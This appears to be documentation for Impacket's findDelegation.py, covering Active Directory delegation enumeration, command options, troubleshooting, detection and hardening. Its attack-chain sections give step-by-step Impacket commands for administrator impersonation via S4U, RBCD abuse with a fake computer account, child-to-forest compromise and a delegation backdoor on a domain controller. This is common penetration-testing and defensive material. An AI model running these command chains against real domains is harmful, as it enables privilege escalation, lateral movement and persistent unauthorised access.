# findDelegation.py

## Overview
`findDelegation.py` is a specialized tool for discovering delegation relationships within Active Directory domains. This tool identifies unconstrained delegation, constrained delegation, and resource-based constrained delegation (RBCD) configurations that can be exploited for privilege escalation and lateral movement attacks.

## Detailed Description
This script queries Active Directory to enumerate all types of delegation relationships that exist within a domain. Delegation mechanisms in AD allow services to impersonate users and access resources on their behalf, but misconfigurations can create significant security vulnerabilities. The tool helps identify potential attack paths by discovering:

- **Unconstrained Delegation**: Systems that can impersonate any user to any service
- **Constrained Delegation**: Systems limited to specific services for impersonation
- **Resource-Based Constrained Delegation (RBCD)**: Target systems that trust specific principals

Understanding delegation relationships is crucial for both attackers and defenders, as these configurations often represent high-value attack paths in AD environments.

### Key Features:
- **Complete Delegation Discovery**: Identifies all three types of delegation relationships
- **Cross-Domain Queries**: Support for querying delegation across domain trusts
- **SPN Validation**: Checks for existence of Service Principal Names
- **Detailed Output**: Provides comprehensive information about delegation configurations
- **Attack Path Identification**: Highlights potential privilege escalation opportunities
- **Trust Relationship Analysis**: Discover delegation relationships across domain boundaries

### Technical Details:
- Uses LDAP queries to enumerate delegation attributes
- Analyzes userAccountControl flags for unconstrained delegation
- Examines msDS-AllowedToDelegateTo for constrained delegation
- Checks msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD
- Validates Service Principal Names associated with delegation
- Supports both authenticated and anonymous enumeration where permitted

## Command Line Options

```
usage: findDelegation.py [-h] [-target-domain TARGET_DOMAIN] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                         [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname]
                         target

Queries target domain for delegation relationships

Required Arguments:
  target                domain[/username[:password]]

Target Options:
  -target-domain TARGET_DOMAIN
                        Domain to query if different than user domain
                        (allows cross-trust delegation discovery)

General Options:
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key for Kerberos Authentication (128 or 256 bits)

Connection:
  -dc-ip ip address     IP Address of the domain controller
  -dc-host hostname     Hostname of the domain controller to use
```
## Usage Examples

### Basic Delegation Discovery
```bash
# Enumerate delegation in current domain
python3 findDelegation.py domain.local/user:password

# Anonymous enumeration (if permitted)
python3 findDelegation.py domain.local/

# Using NTLM hash authentication
python3 findDelegation.py -hashes :ntlmhash domain.local/user

# Using Kerberos authentication
python3 findDelegation.py -k domain.local/user
```

### Cross-Domain Delegation Discovery
```bash
# Query delegation in different domain across trust
python3 findDelegation.py -target-domain target.domain.local source.domain.local/user:password

# Discover delegation relationships in parent domain
python3 findDelegation.py -target-domain parent.domain.local child.parent.domain.local/user:password

# Query delegation in trusted forest
python3 findDelegation.py -target-domain trusted.forest.com domain.local/user:password
```

### Advanced Usage
```bash
# Debug mode for detailed information
python3 findDelegation.py -debug domain.local/user:password

# With timestamps for logging
python3 findDelegation.py -ts domain.local/user:password

# Specify domain controller explicitly
python3 findDelegation.py -dc-ip 192.168.1.10 domain.local/user:password

# Using AES key for Kerberos
python3 findDelegation.py -aesKey aes256key domain.local/user
```

### Output Analysis Examples
```bash
# Save output for analysis
python3 findDelegation.py domain.local/user:password > delegation_report.txt

# Filter for specific delegation types
python3 findDelegation.py domain.local/user:password | grep "Unconstrained"
python3 findDelegation.py domain.local/user:password | grep "Constrained"
python3 findDelegation.py domain.local/user:password | grep "RBCD"

# Look for high-value targets
python3 findDelegation.py domain.local/user:password | grep -E "(DC|Exchange|SQL)"
```

## Attack Chain Integration

### Unconstrained Delegation Exploitation
```bash
# Step 1: Discover unconstrained delegation systems
python3 findDelegation.py domain.local/user:password | grep "Unconstrained"

# Step 2: Compromise system with unconstrained delegation
python3 psexec.py domain.local/user:password@delegation-server.domain.local

# Step 3: Wait for high-value user authentication and extract ticket
# On compromised system: Monitor for TGTs of domain admins
# Extract tickets using mimikatz or other tools

# Step 4: Use extracted tickets for privilege escalation
# Load admin TGT and access domain controller
```

### Constrained Delegation Abuse
```bash
# Step 1: Find constrained delegation configurations
python3 findDelegation.py domain.local/user:password | grep "Constrained"

# Step 2: Compromise account with constrained delegation rights
python3 GetUserSPNs.py domain.local/user:password -request

# Step 3: Use S4U2Self and S4U2Proxy for impersonation
python3 getST.py domain.local/service_account:password -spn cifs/target.domain.local -impersonate administrator

# Step 4: Use forged ticket for access
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

### Resource-Based Constrained Delegation (RBCD)
```bash
# Step 1: Identify RBCD configurations
python3 findDelegation.py domain.local/user:password | grep "RBCD"

# Step 2: Find systems where you can modify msDS-AllowedToActOnBehalfOfOtherIdentity
python3 dacledit.py domain.local/user:password -target target-server -action read

# Step 3: Configure RBCD and create computer account
python3 addcomputer.py domain.local/user:password -computer-name FAKE$ -computer-pass Password123!

# Step 4: Set up RBCD delegation and impersonate admin
python3 rbcd.py domain.local/user:password -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write
python3 getST.py domain.local/FAKE$:Password123! -spn cifs/target.domain.local -impersonate administrator
```

### Cross-Domain Delegation Discovery
```bash
# Step 1: Map delegation across domain trusts
python3 findDelegation.py -target-domain parent.domain.local child.parent.domain.local/user:password
python3 findDelegation.py -target-domain trusted.domain.com domain.local/user:password

# Step 2: Identify cross-domain delegation opportunities
# Look for delegation relationships that span domain boundaries

# Step 3: Exploit cross-domain delegation for forest compromise
python3 raiseChild.py child.domain.local/admin:password -target-exec parent-dc.parent.domain.local
```

### Persistence Through Delegation
```bash
# Step 1: Discover current delegation configurations
python3 findDelegation.py domain.local/admin:password > original_delegation.txt

# Step 2: Add backdoor delegation relationships
python3 rbcd.py domain.local/admin:password -delegate-from 'BACKDOOR$' -delegate-to 'DC$' -action write

# Step 3: Verify new delegation relationship
python3 findDelegation.py domain.local/admin:password | grep "BACKDOOR"

# Step 4: Use backdoor for persistent access
python3 getST.py domain.local/BACKDOOR$:password -spn cifs/dc.domain.local -impersonate administrator
```

## Prerequisites
- Python 3.x with Impacket installed
- Valid domain credentials (or anonymous access if permitted)
- Network access to domain controller via LDAP (389/tcp) or LDAPS (636/tcp)
- Understanding of Active Directory delegation concepts
- Knowledge of Kerberos delegation protocols (S4U2Self, S4U2Proxy)

## Delegation Types Explained

### Unconstrained Delegation
- **Risk Level**: Critical
- **Description**: System can impersonate any user to any service
- **Attack Vector**: Wait for admin logon, extract TGT, use for privilege escalation
- **Common Systems**: Legacy servers, some Exchange servers

### Constrained Delegation
- **Risk Level**: High
- **Description**: System can impersonate users to specific services
- **Attack Vector**: Compromise delegating account, use S4U2Proxy for impersonation
- **Common Systems**: Web servers, application servers

### Resource-Based Constrained Delegation (RBCD)
- **Risk Level**: Medium to High
- **Description**: Target defines which principals can delegate to it
- **Attack Vector**: Modify delegation settings, create controlled principal
- **Common Systems**: Modern Windows servers, computer accounts

## Detection Considerations
- **LDAP Queries**:
  - Unusual queries for delegation attributes
  - Enumeration of userAccountControl flags
  - Queries for msDS-AllowedToDelegateTo attributes
- **Kerberos Indicators**:
  - S4U2Self and S4U2Proxy requests
  - Unusual delegation patterns
  - Cross-domain delegation activities
- **Configuration Changes**:
  - Modifications to delegation settings
  - Creation of new computer accounts with delegation
  - Changes to msDS-AllowedToActOnBehalfOfOtherIdentity

## Defensive Measures
- **Delegation Hardening**:
  - Minimize use of unconstrained delegation
  - Regularly audit delegation configurations
  - Implement constrained delegation where possible
- **Monitoring and Detection**:
  - Monitor for delegation enumeration activities
  - Alert on delegation configuration changes
  - Log S4U2Self and S4U2Proxy activities
- **Access Controls**:
  - Restrict who can modify delegation settings
  - Limit delegation to necessary services only
  - Regular review of delegation relationships
- **Account Protection**:
  - Use Protected Users group for high-value accounts
  - Enable account is sensitive and cannot be delegated flag
  - Implement privileged access workstations (PAWs)

## Common Issues and Troubleshooting

### Access Denied During Enumeration
```bash
# Error: "Access denied" when querying delegation
# Solution: Ensure user has appropriate read permissions
# Anonymous queries may be restricted in hardened environments
python3 findDelegation.py -debug domain.local/user:password
```

### No Results Found
```bash
# Issue: No delegation relationships discovered
# Solution: Verify domain configuration and search scope
# Some delegation may be configured at OU level
# Check if delegation exists but is filtered out
```

### Cross-Domain Query Failures
```bash
# Error: Cannot query target domain
# Solution: Verify trust relationships and credentials
python3 findDelegation.py -debug -target-domain target.domain.local source.domain.local/user:password
# Ensure trust exists and credentials are valid for target domain
```

### LDAP Connection Issues
```bash
# Error: LDAP connection failed
# Solution: Verify network connectivity and domain controller
python3 findDelegation.py -dc-ip 192.168.1.10 domain.local/user:password
# Check firewall settings and LDAP service availability
```

## Related Tools
- [rbcd.py](rbcd.md) - Configure Resource-Based Constrained Delegation
- [getST.py](getST.md) - Obtain service tickets using delegation
- [addcomputer.py](addcomputer.md) - Add computer accounts for delegation
- [dacledit.py](dacledit.md) - Modify permissions for delegation configuration
- [GetUserSPNs.py](GetUserSPNs.md) - Find service accounts that may have delegation
- [psexec.py](psexec.md) - Execute commands on systems with delegation

---

*This documentation is based on the actual source code and functionality of findDelegation.py from Impacket.*
